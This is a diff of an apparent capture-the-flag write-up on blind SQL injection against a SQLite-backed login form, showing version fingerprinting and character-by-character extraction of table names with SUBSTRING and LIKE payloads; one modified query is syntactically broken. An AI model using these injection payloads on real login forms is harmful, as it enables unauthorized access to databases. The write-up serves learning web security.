@@ -50,30 +50,60 @@ i tried ```aboelnour" select version()-- -``` but i got internal server error
 
 so i tried ```aboelnour" select sqlite_version()-- -``` , and response was Wrong password , so our db is ```SQLite``` 
 
+-----
 
 ## Extract table name  
 
-First of all , we have SQL Server SUBSTRING() Function , this function use to extracts some characters from a string. 
++ First of all , we have SQL Server SUBSTRING() Function , this function use to extracts some characters from a     string. 
 
-Ex :
+### Ex :
 
-substring("Aboelnour",1,1) , output will be --> A
++ substring("Aboelnour",1,1) , output will be --> A
 
-substring("Aboelnour",2,1) , output will be --> b 
++ substring("Aboelnour",2,1) , output will be --> b 
 
-and so on 
+and so on
+
++ we have alos SQL LIKE Operator : you can check it on "https://www.w3schools.com/sql/sql_like.asp"
+
+
 
 so if we have table name = users and column name = user we can enum users with query like this 
 
-substring((select user from users where user like '%a%'),1,1) = 'a'
+```substring((select user from users where user like '%a%'),1,1) = 'a'```
 
-so let how to extract tables from sqlitedb and found this payloads in payloadsALLTheThings on github : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version
+operator ```like '%a%``` : will finds any values that have a on any position  
 
-### Extract table name
+then i have searched about how to extract tables from SQLitedb and found this payloads in payloadsALLTheThings on github : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version
+
+
+I got this query to Extract table names
+
 ```
 SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 ```
 
+I have modified it to this query below to find any table have fl in any position  
+
+```
+SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_% AND like '%fl%'
+```
+
+so our final payload will be : 
+
+```admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like '%fl%'),1,1) = 'f' -- -```
+
+i tried it and i have got User not found so the first char not f 
+
+So i have tried
+
+```admin"and SUBSTRING((SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' and tbl_name like '%fl%'),1,1) = 'F' -- -``` , i have got Wrong password so the first character is F 
+
+but it will be hard to make it manually so i have wrote python script to got table name 
+
+----
+
+## Exploit code 
 
 
 
